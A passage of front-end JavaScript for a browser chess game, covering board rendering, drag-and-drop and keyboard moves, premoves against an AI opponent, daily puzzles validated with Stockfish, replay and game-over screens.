            if (whiteYouTag) whiteYouTag.style.display = 'none';
            if (blackYouTag) blackYouTag.style.display = 'none';
        }
    }


    /* ==========================================================
    BOARD RENDERING
    ========================================================== */
    function buildBoard() {
        boardEl.innerHTML = '';
        for (let vr = 0; vr < 8; vr++) {
            for (let vc = 0; vc < 8; vc++) {
                const r = flipped ? 7 - vr : vr;
                const c = flipped ? 7 - vc : vc;
                const d = document.createElement('div');
                d.className = 'square ' + ((vr + vc) % 2 ? 'dark' : 'light');
                d.dataset.r = r;
                d.dataset.c = c;
                d.onclick = () => onClick(r, c);
                d.oncontextmenu = (e) => {
                    e.preventDefault();
                    toggleSquareHighlight(r, c);
                };
                d.ondragover = e => e.preventDefault();
                d.ondrop = e => onDrop(e, r, c);

                // ADD THESE:
                d.draggable = true;
                d.ondragstart = e => {
                    const isPremoveMode = gameMode === 'ai' && turn !== playerColor;
                    const vBoard = isPremoveMode ? getVirtualBoard() : board;
                    const piece = vBoard[r][c];
                    if (!piece) {
                        if (blindfoldMode) {
                            showStatus('No piece there', true);
                            flashBoard();
                        }
                        return e.preventDefault();
                    }
                    if (paused || gameOver) return e.preventDefault();

                    const isPremovedDrag = gameMode === 'ai' && turn !== playerColor && pColor(piece) === playerColor;

                    // If it's the AI's turn, only allow dragging if it's a valid premove
                    if (gameMode === 'ai' && turn !== playerColor && !isPremovedDrag) {
                        return e.preventDefault();
                    }

                    // For all other normal moves, you can only drag your own pieces on your turn
                    if (!isPremovedDrag && pColor(piece) !== turn) {
                        return e.preventDefault();
                    }

                    if (e.dataTransfer) {
                        e.dataTransfer.setData('text/plain', 'piece-move');
                        e.dataTransfer.effectAllowed = 'move';
                    }

                    const pieceImg = d.querySelector('.piece');
                    if (pieceImg) e.dataTransfer.setDragImage(pieceImg, pieceImg.offsetWidth / 2, pieceImg.offsetHeight / 2);

                    dragging = true;
                    dragSrc = { r, c };
                    setTimeout(() => selectPiece(r, c), 10);
                };

                d.ondragend = () => {
                    dragging = false;
                    dragSrc = null;
                };

                d.setAttribute('tabindex', '0');
                d.setAttribute('role', 'gridcell');
                d.setAttribute('data-row', r);
                d.setAttribute('data-col', c);
                d.setAttribute('aria-label', getSquareLabel(r, c));
                d.onkeydown = (e) => handleSquareKeydown(e, r, c);

                boardEl.appendChild(d);
            }
        }
        syncPieces();
        updateLabels();
    }

    function updateLabels() {
        const ranks = ['8', '7', '6', '5', '4', '3', '2', '1'];
        const files = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'];
        if (flipped) {
            ranks.reverse();
            files.reverse();
        }
        const rLabels = document.getElementById('ranksLabels');
        const fLabels = document.getElementById('filesLabels');
        if (rLabels) rLabels.innerHTML = ranks.map(r => `<span>${r}</span>`).join('');
        if (fLabels) fLabels.innerHTML = files.map(f => `<span>${f}</span>`).join('');
    }

    function syncPieces() {
        for (let r = 0; r < 8; r++) for (let c = 0; c < 8; c++) {
            const el = sq(r, c);
            el.innerHTML = '';
            const p = board[r][c];
            if (!p) continue;

            const img = document.createElement('img');
            img.src = PIECE_IMG[pKey(p)];
            img.className = 'piece';
            //Set to false, as the parent div now handles dragging
            img.draggable = false;
            // Keep this so drops work smoothly on occupied squares
            img.ondragover = e => e.preventDefault();
            el.appendChild(img);
        }
        refreshHighlights();
        markPlayable();
        updateMaterialUI(board);
    }

    function markPlayable() {
        boardEl.querySelectorAll('.piece').forEach(img => {
            const el = img.closest('.square');
            const r = parseInt(el.dataset.r);
            const c = parseInt(el.dataset.c);
            const p = board[r][c];
            const isPlayable = p && (
                pColor(p) === turn ||
                (gameMode === 'ai' && pColor(p) === playerColor)
            );
            img.classList.toggle('playable', isPlayable);
        });
    }

    function refreshHighlights() {
        boardEl.querySelectorAll('.square').forEach(el => {
            el.classList.remove('selected', 'last-move', 'in-check', 'custom-highlight');
            el.querySelectorAll('.move-dot, .capture-ring').forEach(n => n.remove());
        });

        if (lastMove) {
            sq(lastMove.from[0], lastMove.from[1]).classList.add('last-move');
            sq(lastMove.to[0], lastMove.to[1]).classList.add('last-move');
        }
        if (highlightedSquare) {
            sq(highlightedSquare.r, highlightedSquare.c)
                .classList.add('custom-highlight');
        }
        if (selected) {
            sq(selected.r, selected.c).classList.add('selected');
            hints.forEach(h => {
                const el = sq(h.row, h.col);
                const d = document.createElement('div');
                d.className = h.is_capture ? 'capture-ring' : 'move-dot';
                el.appendChild(d);
            });
        }
        refreshPremoveHighlight();
    }

    function refreshPremoveHighlight() {
        boardEl.querySelectorAll('.square').forEach(el => {
            el.classList.remove('premove');
        });

        premoveQueue.forEach(pm => {
            const fromSq = sq(pm.from.r, pm.from.c);
            const toSq = sq(pm.to.r, pm.to.c);
            if (fromSq) fromSq.classList.add('premove');
            if (toSq) toSq.classList.add('premove');
        });

        drawPremoveArrows();
    }

    function highlightCheck() {
        boardEl.querySelectorAll('.square').forEach(el => {
            el.classList.remove('in-check');
        });
    }

    function applyCheckHighlight() {
        highlightCheck();
        // Use turn to find the king that's in check
        // After AI moves, turn has switched back to the player being checked
        const kingPiece = turn === 'white' ? 'K' : 'k';
        for (let r = 0; r < 8; r++) {
            for (let c = 0; c < 8; c++) {
                if (board[r][c] === kingPiece) {
                    sq(r, c).classList.add('in-check');
                    return;
                }
            }
        }
    }

    // converts row/col to chess notation e.g. row=0,col=0 → "a8"
    function getSquareLabel(row, col) {
        const files = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'];
        const ranks = ['8', '7', '6', '5', '4', '3', '2', '1'];
        return files[col] + ranks[row];
    }

    // Arrow keys to move focus, Enter/Space to click, Escape to cancel
    function handleSquareKeydown(e, row, col) {
        let newRow = row;
        let newCol = col;

        switch (e.key) {
            case 'ArrowUp': e.preventDefault(); newRow = row - 1; break;
            case 'ArrowDown': e.preventDefault(); newRow = row + 1; break;
            case 'ArrowLeft': e.preventDefault(); newCol = col - 1; break;
            case 'ArrowRight': e.preventDefault(); newCol = col + 1; break;
            case 'Enter':
            case ' ':
                e.preventDefault();
                onClick(row, col);
                return;
            case 'Escape':
                e.preventDefault();
                document.querySelectorAll('.square.selected')
                    .forEach(s => s.classList.remove('selected'));
                return;
            default:
                return;
        }
        // clamp within board
        newRow = Math.max(0, Math.min(7, newRow));
        newCol = Math.max(0, Math.min(7, newCol));
        const target = boardEl.querySelector(
            `[data-row="${newRow}"][data-col="${newCol}"]`
        );
        if (target) target.focus();
    }

    /* ==========================================================
    SELECTION & MOVES
    ========================================================== */
    async function selectPiece(r, c) {
        const isPremoveMode = gameMode === 'ai' && turn !== playerColor;
        const vBoard = isPremoveMode ? getVirtualBoard() : board;
        const p = vBoard[r][c];

        if (!p || paused || gameOver) return;

        selected = { r, c };

        // PREMOVE MODE DURING AI TURN
        if (
            gameMode === 'ai' &&
            turn !== playerColor &&
            pColor(p) === playerColor
        ) {
            hints = [];

            refreshHighlights();
            return;
        }

        // NORMAL MOVE LOGIC
        const data = await get(`/api/valid-moves/?row=${r}&col=${c}`);

        hints = data.valid_moves || [];

        refreshHighlights();
    }
    function toggleSquareHighlight(r, c) {
        if (highlightedSquare) {
            sq(highlightedSquare.r, highlightedSquare.c)
                .classList.remove('custom-highlight');
        }

        if (
            highlightedSquare &&
            highlightedSquare.r === r &&
            highlightedSquare.c === c
        ) {
            highlightedSquare = null;
        } else {
            highlightedSquare = { r, c };
            sq(r, c).classList.add('custom-highlight');
        }
    }
    function deselect() {
        selected = null;
        hints = [];
        refreshHighlights();
    }

    function isPromotionMove(fr, fc, tr) {
        const p = board[fr][fc];
        if (!p) return false;
        return (p === 'P' && tr === 0) || (p === 'p' && tr === 7);
    }

    function showPromoModal(color) {
        const prefix = color === 'white' ? 'w' : 'b';
        const pieces = [
            { key: 'q', label: 'Queen' },
            { key: 'r', label: 'Rook' },
            { key: 'b', label: 'Bishop' },
            { key: 'n', label: 'Knight' },
        ];
        promoChoices.innerHTML = '';
        pieces.forEach(({ key }) => {
            const btn = document.createElement('button');
            btn.className = 'promo-btn';
            const img = document.createElement('img');
            img.src = PIECE_IMG[prefix + key];
            btn.appendChild(img);
            btn.onclick = () => onPromoChoice(key);
            promoChoices.appendChild(btn);
        });
        promoOverlay.classList.add('active');
    }

    function hidePromoModal() {
        promoOverlay.classList.remove('active');
        pendingPromo = null;
    }

    async function onPromoChoice(choice) {
        if (!pendingPromo) return;
        const { fr, fc, tr, tc } = pendingPromo;
        hidePromoModal();
        await executeMove(fr, fc, tr, tc, choice, true);
    }

    async function tryMove(fr, fc, tr, tc) {
        if (paused || gameOver) return;

        const isPremoveMode = gameMode === 'ai' && turn !== playerColor;
        const vBoard = isPremoveMode ? getVirtualBoard() : board;
        const p = vBoard[fr][fc];
        if (!p) return;

        // PREMOVE DURING AI TURN
        if (
            gameMode === 'ai' &&
            pColor(p) === playerColor &&
            turn !== playerColor
        ) {
            premoveQueue.push({
                from: { r: fr, c: fc },
                to: { r: tr, c: tc }
            });

            refreshPremoveHighlight();
            showStatus("Premove queued", false);

            selected = null;
            hints = [];
            refreshHighlights();

            return;
        }

        // NORMAL MOVE VALIDATION
        if (pColor(p) !== turn) {
            deselect();
            return;
        }

        if (fr === tr && fc === tc) {
            deselect();
            return;
        }

        if (isPromotionMove(fr, fc, tr)) {
            await animateMove(fr, fc, tr, tc);

            pendingPromo = { fr, fc, tr, tc };

            const color = pColor(p);
            showPromoModal(color);

            return;
        }

        await executeMove(fr, fc, tr, tc, null);
    } let reconnecting = false;
    async function handleReconnect() {
        if (reconnecting) return;
        reconnecting = true;
        showStatus('Reconnecting...', false);
        let retries = 0;
        let success = false;
        while (retries < 3 && !success) {
            try {
                await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, retries)));
                await loadGame();
                success = true;
            } catch (err) {
                retries++;
            }
        }

        if (success) {
            showStatus('Connection restored', false);
            setTimeout(() => {
                showStatus('', false);
            }, 2000);
        } else {
            showStatus('Unable to reconnect. Please refresh.', true);
        }
        reconnecting = false;
    } async function executeMove(fr, fc, tr, tc, promotionPiece, skipAnimation = false) {
        try {
            const body = {
                from_row: fr, from_col: fc,
                to_row: tr, to_col: tc,
            };
            if (promotionPiece) body.promotion_piece = promotionPiece;

            const data = await post('/api/move/', body);

            // Opening Trainer validation
            if (openingTrainerMode) {
                const expectedMove =
                    openingTrainerSteps[currentTrainerStep]?.expected_move;

                const playedMove =
                    `${toSquare(fr, fc)}-${toSquare(tr, tc)}`;

                if (
                    playedMove.toLowerCase() !== expectedMove.toLowerCase()
                ) {
                    showStatus(
                        `Incorrect move. Expected: ${expectedMove}`,
                        true
                    );

                    deselect();
                    return;
                }

                currentTrainerStep++;
                if (
                    currentTrainerStep >=
                    openingTrainerSteps.length
                ) {
                    openingTrainerMode = false;

                    showStatus(
                        "Opening sequence completed!",
                        false
                    );
                }
            }

            if (data.valid) {
                illegalMoveCount = 0;
                playSound(data);
                if (!skipAnimation) await animateMove(fr, fc, tr, tc);
                board = parseBoard(data.board);
                turn = data.current_turn;

                const hasThreefoldWarning = data.threefold_warning;

                if (hasThreefoldWarning) {
                    showStatus(
                        '⚠️ This position has appeared twice. One more repetition will trigger a draw.',
                        false
                    );
                }

                // Daily Puzzle Validation
                if (dailyPuzzleMode && currentPuzzle && !puzzleAnalyzing) {

                    const playedMove =
                        `${String.fromCharCode(97 + fc)}${8 - fr}` +
                        `${String.fromCharCode(97 + tc)}${8 - tr}`;

                    const expectedMove =
                        currentPuzzle.solution[puzzleMoveIndex];

                    if (playedMove === expectedMove) {

                        clearPuzzleHints();

                        puzzleMoveIndex++;
                        currentPuzzleFen = data.fen;
                        expectedMoveEval = null;
                        precalculateExpectedMoveEval();

                        if (puzzleMoveIndex >= currentPuzzle.solution.length) {

                            const streak = updatePuzzleStreak();
                            updateStreakDisplay();
                            showConfirm(
                                "🎉 Puzzle Solved!",
                                `🔥 Current Streak: ${streak}<br> 
                                                    🏆 Best Streak: ${getPuzzleStreak().longestStreak}<br>
                                                    Come back tomorrow for a new challenge.`,
                                () => {
                                    gameLayout.style.visibility = "hidden";
                                    welcomeOverlay.classList.add("active");
                                },
                                "#f0c040"
                            );
                            return;
                        }
                    } else {
                        // Start Stockfish validation for alternative moves
                        puzzleAnalyzing = true;
                        const origStatus = document.getElementById("game-status") ? document.getElementById("game-status").textContent : "";
                        showStatus("Analyzing move with Stockfish...", false);

                        validateMoveWithStockfish(currentPuzzleFen, data.fen, expectedMove)
                            .then((isCorrect) => {
                                puzzleAnalyzing = false;
                                showStatus(origStatus, false);

                                if (isCorrect) {
                                    puzzleMoveIndex++;
                                    currentPuzzleFen = data.fen;
                                    expectedMoveEval = null;
                                    precalculateExpectedMoveEval();

                                    if (puzzleMoveIndex >= currentPuzzle.solution.length) {
                                        const streak = updatePuzzleStreak();
                                        updateStreakDisplay();
                                        showConfirm(
                                            "🎉 Puzzle Solved!",
                                            `🔥 Current Streak: ${streak}<br> 
                                                                🏆 Best Streak: ${getPuzzleStreak().longestStreak}<br>
                                                                Come back tomorrow for a new challenge.`,
                                            () => {
                                                gameLayout.style.visibility = "hidden";
                                                welcomeOverlay.classList.add("active");
                                            },
                                            "#f0c040"
                                        );
                                    }
                                } else {
                                    showConfirm(
                                        "❌ Incorrect Move!",
                                        "Would you like to try again?",
                                        () => {
                                            startDailyPuzzle();
                                        },
                                        "#ff4d4d"
                                    );
                                }
                            })
                            .catch((err) => {
                                console.error("Stockfish validation promise error:", err);
                                puzzleAnalyzing = false;
                                showStatus(origStatus, false);
                                showConfirm(
                                    "❌ Incorrect Move!",
                                    "Would you like to try again?",
                                    () => {
                                        startDailyPuzzle();
                                    },
                                    "#ff4d4d"
                                );
                            });
                        return;
                    }
                }

                lastMove = { from: [fr, fc], to: [tr, tc] };

                if (gameMode === 'pvp' && autoFlip) {
                    flipped = (turn === 'black');
                    buildBoard();
                }
                whiteTime = data.white_time;
                blackTime = data.black_time;

                selected = null;
                hints = [];
                updatePlayerNames(data);
                updateTurn();
                updateMoves(data.move_history);
                updateCaptured(data.captured_pieces);
                syncPieces();
                renderClocks();
                startTimer();
                updateMaterialUI(board);
                let a11yMsg = '';
                const playedColor = turn === 'white' ? 'Black' : 'White';
                if (data.captured) {
                    const targetSquare = getSquareLabel(tr, tc);
                    const pieceCode = (typeof data.captured === 'string') ? data.captured : '';
                    const pieceName = PIECE_NAMES[pieceCode.toLowerCase()] || 'piece';
                    const capturer = playedColor;
                    const capturedColor = capturer === 'White' ? 'Black' : 'White';
                    a11yMsg = `${capturer} captured ${capturedColor}'s ${pieceName} on ${targetSquare}. `;
                } else if (data.move_history && data.move_history.length > 0) {
                    const lastMove = data.move_history[data.move_history.length - 1].notation;
                    if (window.checkLessonMove && lastMove) {
                        window.checkLessonMove(lastMove);
                    }
                    a11yMsg = `${playedColor} played ${lastMove}. `;
                }

                const gameEnded = handleGameStatus(data.game_status, data.draw_reason);
                if (!gameEnded) {
                    if (data.game_status === 'check') {
                        applyCheckHighlight();
                        const checkMsg = turn === 'white' ? 'Check to White King!' : 'Check to Black King!';
                        showStatus(checkMsg, true);
                        a11yMsg += checkMsg;
                    } else {
                        highlightCheck();
                        if (!hasThreefoldWarning) {
                            showStatus('', false);
                        }
                    }
                    if (a11yMsg) announceMove(a11yMsg);
                }

                if (gameMode === 'ai' && turn !== playerColor && !gameOver) {
                    requestAIMove();
                }
            } else {
                showStatus(data.message, true);
                flashBoard();
                deselect();
                if (premoveQueue.length > 0) {
                    premoveQueue = [];
                    refreshPremoveHighlight();
                }
            }
        } catch (e) {
            await handleReconnect();
        }
    }

    async function requestAIMove() {
        if (gameOver || aiThinking) return;
        // Increment and store current sequence value to identify this specific request
        const seq = ++aiRequestSeq;
        aiThinking = true;

       
        try {
            let piecesOnBoard = 0;
            for (let r = 0; r < 8; r++) {
                for (let c = 0; c < 8; c++) {
                    if (board[r][c]) piecesOnBoard++;
                }
            }

            // randomized delay per difficulty — feels realistic and unpredictable
            let delay;
            if (currentDifficulty === 'easy') delay = 800 + Math.random() * (1500 - 800);
            else if (currentDifficulty === 'hard') delay = 2500 + Math.random() * (4000 - 2500);
            else delay = 1500 + Math.random() * (2500 - 1500); // medium
            await new Promise(resolve => setTimeout(resolve, delay));

            // Abort if a new game started, reconnect happened, or another request took over during delay
            if (seq !== aiRequestSeq) return;

            // fix: abort if game ended during delay
            if (gameOver) return;

            const data = await post('/api/ai-move/', {});
            

            // Abort if sequence is no longer current after API call completes
            if (seq !== aiRequestSeq) {
                return;
            }

            if (data.valid) {
                playSound(data);
                const mv = data.ai_move;
                await animateMove(mv.from_row, mv.from_col, mv.to_row, mv.to_col);
                board = parseBoard(data.board);
                turn = data.current_turn;
                if (data.threefold_warning) {
                    showStatus(
                        '⚠️ This position has appeared twice. One more repetition will trigger a draw.',
                        false
                    );
                }

                lastMove = { from: [mv.from_row, mv.from_col], to: [mv.to_row, mv.to_col] };
                whiteTime = data.white_time;
                blackTime = data.black_time;

                selected = null;
                hints = [];
                updatePlayerNames(data);
                updateTurn();
                updateMoves(data.move_history);
                updateCaptured(data.captured_pieces);
                syncPieces();
                renderClocks();
                startTimer();
                updateMaterialUI(board);
                let a11yMsg = '';
                const playedColor = turn === 'white' ? 'Black' : 'White';
                if (data.captured) {
                    const targetSquare = getSquareLabel(mv.to_row, mv.to_col);
                    const pieceCode = (typeof data.captured === 'string') ? data.captured : '';
                    const pieceName = PIECE_NAMES[pieceCode.toLowerCase()] || 'piece';
                    const capturer = playedColor;
                    const capturedColor = capturer === 'White' ? 'Black' : 'White';
                    a11yMsg = `${capturer} captured ${capturedColor}'s ${pieceName} on ${targetSquare}. `;
                } else if (data.move_history && data.move_history.length > 0) {
                    const lastMove = data.move_history[data.move_history.length - 1].notation;
                    if (window.checkLessonMove && lastMove) {
                        window.checkLessonMove(lastMove);
                    }
                    a11yMsg = `AI played ${lastMove}. `;
                }

                const gameEnded = handleGameStatus(data.game_status, data.draw_reason);
                if (!gameEnded) {
                    if (data.game_status === 'check') {
                        applyCheckHighlight();
                        const checkMsg = turn === 'white' ? 'Check to White King!' : 'Check to Black King!';
                        showStatus(checkMsg, true);
                        a11yMsg += checkMsg;
                    } else {
                        highlightCheck();
                        if (!hasThreefoldWarning) {
                            showStatus('Your turn.', false);
                        }
                    }
                    if (a11yMsg) announceMove(a11yMsg);

                    // Trigger queued premove if it exists
                    if (premoveQueue.length > 0) {
                        const queued = premoveQueue.shift();
                        refreshPremoveHighlight();

                        const piece = board[queued.from.r][queued.from.c];
                        if (piece && pColor(piece) === turn) {
                            setTimeout(() => {
                                tryMove(queued.from.r, queued.from.c, queued.to.r, queued.to.c);
                            }, 150);
                        } else {
                            premoveQueue = [];
                            refreshPremoveHighlight();
                            showStatus("Premove cancelled: piece captured or invalid", true);
                        }
                    }
                }
            } else {
                showStatus(data.message, true);
            }
            } catch (e) {
                await handleReconnect();
            } finally {
            // always reset aiThinking... a stale sequence means a newer request owns it, but it will set its own flag
            aiThinking = false;
        }
    }

    /* ==========================================================
    EVENTS
    ========================================================== */
    async function onClick(r, c) {
        if (replayMode) return;
        if (dragging && !touchDragging) return;

        const isPremoveMode = gameMode === 'ai' && turn !== playerColor;
        const vBoard = isPremoveMode ? getVirtualBoard() : board;
        const piece = vBoard[r][c];

        const aiPremoveMode =
            gameMode === 'ai' &&
            turn !== playerColor;

        if (selected) {

            // deselect same square
            if (selected.r === r && selected.c === c) {
                return deselect();
            }

            // PREMOVE CLICK
            if (aiPremoveMode) {

                premoveQueue.push({
                    from: { r: selected.r, c: selected.c },
                    to: { r, c }
                });

                refreshPremoveHighlight();

                showStatus("Premove queued", false);

                selected = null;
                hints = [];
                refreshHighlights();

                return;
            }

            // NORMAL MOVE
            if (hints.some(h => h.row === r && h.col === c)) {
                return tryMove(selected.r, selected.c, r, c);
            }

            // reselect another piece
            if (piece && pColor(piece) === turn) {
                return selectPiece(r, c);
            }

            return deselect();
        }

        // selecting initial piece
        if (
            piece &&
            (
                pColor(piece) === turn ||
                (
                    aiPremoveMode &&
                    pColor(piece) === playerColor
                )
            )
        ) {
            return selectPiece(r, c);
        }
    }

    function onDragStart(e, r, c) {

        const isPremoveMode = gameMode === 'ai' && turn !== playerColor;
        const vBoard = isPremoveMode ? getVirtualBoard() : board;
        const piece = vBoard[r][c];
        if (!piece) {
            if (blindfoldMode) {
                showStatus('No piece there', true);
                flashBoard();
            }
            return e.preventDefault();
        }
        if (paused || gameOver) return e.preventDefault();

        const isPremovedDrag = gameMode === 'ai' && turn !== playerColor && pColor(piece) === playerColor;

        // If it's the AI's turn, only allow dragging if it's a valid premove
        if (gameMode === 'ai' && turn !== playerColor && !isPremovedDrag) {
            return e.preventDefault();
        }

        // For all normal moves, you can only drag your own pieces on your turn
        if (!isPremovedDrag && pColor(piece) !== turn) {
            return e.preventDefault();
        }

        dragging = true;
        dragSrc = { r, c };
        selectPiece(r, c);
    }

    async function onDrop(e, tr, tc) {
        if (replayMode) return;
        if (!dragSrc) return;
        await tryMove(dragSrc.r, dragSrc.c, tr, tc);
        dragSrc = null;
    }

    function resetReplayBoard() {
        if (window.Chess) {
            replayBoard = new window.Chess();
        }
    }

    function renderReplayPosition() {

        if (!replayBoard) return;

        const fen = replayBoard.fen();
        const position = fen.split(' ')[0];
        const rows = fen.split(' ')[0].split('/');

        board = rows.map(row => {

            const expanded = [];

            for (const ch of row) {

                if (!isNaN(ch)) {

                    for (let i = 0; i < Number(ch); i++) {
                        expanded.push(null);
                    }

                } else {
                    expanded.push(ch);
                }
            }

            return expanded;
        });

        buildBoard();
        if (typeof syncPieces === 'function') {
            syncPieces();
        }

        if (typeof updateMaterialUI === 'function') {
            updateMaterialUI(board);
        }
    }
    function goToReplayMove(index) {

        if (!window.Chess) {
            console.error("Chess.js not loaded");
            return;
        }

        replayBoard = new window.Chess();

        try {

            for (let i = 0; i < index; i++) {

                const move = replayMoves[i];

                if (move) {
                    const result = replayBoard.move(move);

                }
            }

            replayIndex = index;

            renderReplayPosition();

        } catch (e) {

            console.error("Replay move error:", e);
        }
    }

    /* ==========================================================
    UI UPDATES
    ========================================================== */
    function updateTurn() {
        if (
            !turnEl ||
            !whiteNameLabel ||
            !blackNameLabel ||
            !wCapEl ||
            !bCapEl
        ) {
            return;
        }

        const badge = turnEl;
        badge.className = 'turn-badge ' + turn;

        let label = turn.charAt(0).toUpperCase() + turn.slice(1) + "'s Turn";
        const pName = turn === 'white' ? whiteNameLabel.textContent : blackNameLabel.textContent;
        label = pName + "'s Turn";

        if (gameMode === 'ai') {
            if (turn === playerColor) {
                label = "Your Turn";
            } else {
                label = "AI is thinking...";
            }
        }
        badge.textContent = label;
        if (turnBadgeText) turnBadgeText.textContent = pName;

        wCapEl.classList.toggle('active', turn === 'white');
        bCapEl.classList.toggle('active', turn === 'black');
    }

    function updateMoves(history) {
        if (!history?.length) {
            movesEl.innerHTML = '<span class="placeholder">No moves yet</span>';
            return;
        }
        movesEl.innerHTML = '';
        const totalPairs = Math.ceil(history.length / 2);
        for (let i = history.length - 1; i >= 0; i -= 2) {
            const whiteIdx = i % 2 === 0 ? i : i - 1;
            const blackIdx = whiteIdx + 1;
            const moveNum = Math.floor(whiteIdx / 2) + 1;
            const row = document.createElement('div');
            row.className = 'move-row';
            row.innerHTML = `
                                <span class="move-num">${moveNum}.</span>
                                <span class="move-white">${history[whiteIdx]?.notation ?? ''}</span>
                                ${history[blackIdx] ? `<span class="move-black">${history[blackIdx].notation}</span>` : ''}
                            `;
            movesEl.appendChild(row);
        }
        movesEl.scrollTop = 0;
    }

    function updateCaptured(cap) {
        wCapEl.innerHTML = bCapEl.innerHTML = '';

        // Use global MATERIAL_VALUES instead of redefining locally (DRY principle)
        const sortByValue = (pieces) => [...pieces].sort((a, b) =>
            (MATERIAL_VALUES[b.toLowerCase()] || 0) - (MATERIAL_VALUES[a.toLowerCase()] || 0)
        );

        let whitePoints = cap.white.reduce((sum, p) => sum + (MATERIAL_VALUES[p.toLowerCase()] || 0), 0);
        let blackPoints = cap.black.reduce((sum, p) => sum + (MATERIAL_VALUES[p.toLowerCase()] || 0), 0);

        const pieceNames = { 'p': 'Pawn', 'n': 'Knight', 'b': 'Bishop', 'r': 'Rook', 'q': 'Queen' };

        // Use createElement instead of innerHTML to prevent XSS and avoid DOM reflows
        const makeImg = (p) => {
            const img = document.createElement('img');
            img.src = PIECE_IMG[pKey(p)];
            img.className = 'captured-img';
            const name = pieceNames[p.toLowerCase()] || p;
            img.title = name;
            img.alt = name;
            return img;
        };

        sortByValue(cap.white).forEach((p) => wCapEl.appendChild(makeImg(p)));
        sortByValue(cap.black).forEach((p) => bCapEl.appendChild(makeImg(p)));

        const wPointsEl = document.getElementById('whitePoints');
        const bPointsEl = document.getElementById('blackPoints');
        if (wPointsEl) wPointsEl.textContent = `+${whitePoints}`;
        if (bPointsEl) bPointsEl.textContent = `+${blackPoints}`;
    }

    function showStatus(msg, err) {
        const gameStatusEl = document.getElementById("game-status");

        if (gameStatusEl) {
            gameStatusEl.textContent = msg;
        }

        statusEl.className = 'status-bar' + (err ? ' error' : '');
    }

    function handleGameStatus(status, drawReason) {
        if (dailyPuzzleMode) {
            return false;
        }
        if (status === 'checkmate') {
            endGame('checkmate', turn);
            return true;
        }
        if (status === 'stalemate') {
            endGame('stalemate', turn);
            return true;
        }
        if (status === 'draw') {
            endGame('draw', turn, drawReason);
            return true;
        }
        return false;
    }

    async function endGame(reason, color, drawReason = null) {
        if (gameOver) return;
        gameOver = true;
        const frozenPlayerColor = playerColor;
        replayMode = true;
        paused = true;
        clearInterval(timerInterval);

        if (blindfoldMode) {
            blindfoldMode = false;
            document.body.classList.remove('blindfold-mode');
            const blindfoldBtn = document.getElementById('blindfoldBtn');
            if (blindfoldBtn) blindfoldBtn.textContent = 'Blindfold: OFF';
        }
        updateThinkingDots();

        let title = '', message = '';

        // Determine PVP or AI result relative to current player color
        const isWon = reason === 'checkmate' || reason === 'resign' || reason === 'timeout';
        const winnerColor = isWon ? (color === 'white' ? 'black' : 'white') : null;

        let resultState = 'draw'; // 'victory', 'defeat', 'draw'
        if (isWon) {
            if (gameMode === 'ai') {
                resultState = (winnerColor === frozenPlayerColor) ? 'victory' : 'defeat';
            } else {
                resultState = 'victory'; // Celebrate PvP victory for either side
            }
        }

        let isCelebration = (resultState === 'victory');


        // Play distinct game over sound
        playGameOverSound(reason, resultState);

        if (reason === 'checkmate') {
            const winnerName = color === 'white' ? blackNameLabel.textContent : whiteNameLabel.textContent;
            title = 'Checkmate';
            message = `${winnerName} Wins!`;
        } else if (reason === 'stalemate') {
            title = 'Stalemate';
            message = 'The game is a draw.';
        } else if (reason === 'draw') {
            title = 'Draw';
            const drawMessages = {
                agreement: 'Draw by agreement.',
                threefold_repetition: 'Draw by repetition.',
                fifty_move_rule: 'Draw by fifty-move rule.',
                insufficient_material: 'Draw by insufficient material.',
            };
            message = drawMessages[drawReason] || 'The game is a draw.';
        } else if (reason === 'resign') {
            const winnerName = color === 'white' ? blackNameLabel.textContent : whiteNameLabel.textContent;
            const loserName = color === 'white' ? whiteNameLabel.textContent : blackNameLabel.textContent;
            title = 'Victory';
            message = `${loserName} resigned. ${winnerName} Wins!`;
        } else if (reason === 'timeout') {
            const winnerName = color === 'white' ? blackNameLabel.textContent : whiteNameLabel.textContent;
            const loserName = color === 'white' ? whiteNameLabel.textContent : blackNameLabel.textContent;
            title = 'Timeout';
            message = `${loserName} ran out of time. ${winnerName} Wins!`;
        }

        if (resignBtn) resignBtn.style.display = 'none';
        if (drawBtn) drawBtn.style.display = 'none';
        if (pauseBtn) pauseBtn.style.display = 'none';
        if (newPvPBtn) newPvPBtn.style.display = '';
        if (newAIBtn) newAIBtn.style.display = '';
        if (dailyPuzzleBtn) dailyPuzzleBtn.style.display = '';
        if (newFenBtn) newFenBtn.style.display = '';

        let durationText = '';

        if (gameStartTime) {
            const duration = Date.now() - gameStartTime;
            durationText = formatGameDuration(duration);
        }

        replayMoves = [];
        replayIndex = 0;

        // Reverse the rows so we get the oldest moves first
        const moveRows = Array.from(document.querySelectorAll('.move-row')).reverse();

        moveRows.forEach(row => {
            const spans = row.querySelectorAll('.move-white, .move-black');
            spans.forEach(span => {
                const move = span.textContent
                    ?.replace(/[+#]/g, '')
                    ?.replace(/\s+/g, '')
                    ?.trim();

                if (move && move !== '...') {
                    console.log("Replay move added:", move);
                    replayMoves.push(move);
                }
            });
        });

        console.log("FINAL REPLAY MOVES:", replayMoves);

        if (window.Chess) {
            replayBoard = new window.Chess();
        }
        resetReplayBoard();

        if (replayControls) {
            replayControls.classList.remove('hidden');
        }

        // 1. Dynamic Banner Setup
        const bannerEl = document.getElementById('gameOverBanner');
        const bannerIconEl = document.getElementById('bannerIcon');

        if (bannerEl) {
            bannerEl.className = 'result-banner';
            if (resultState === 'victory') {
                bannerEl.classList.add('banner-victory');
                if (bannerIconEl) bannerIconEl.textContent = '🏆';
                gameOverTitle.textContent = 'VICTORY';
            } else if (resultState === 'defeat') {
                bannerEl.classList.add('banner-defeat');
                if (bannerIconEl) bannerIconEl.textContent = '💀';
                gameOverTitle.textContent = 'DEFEAT';
            } else {
                bannerEl.classList.add('banner-draw');
                if (bannerIconEl) bannerIconEl.textContent = '🤝';
                gameOverTitle.textContent = 'DRAW';
            }
        }

        gameOverMessage.textContent = message;

        // 2. Result Illustration injection
        const illustrationEl = document.getElementById('gameOverIllustration');
        if (illustrationEl) {
            let svgContent = '';
            if (resultState === 'defeat') {
                if (reason === 'timeout') {
                    svgContent = `
                                        <svg class="res-svg-illustration" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M10 80 H90 L80 90 H20 Z" fill="#252545" opacity="0.6"/>
                                            <g class="svg-animate-hourglass">
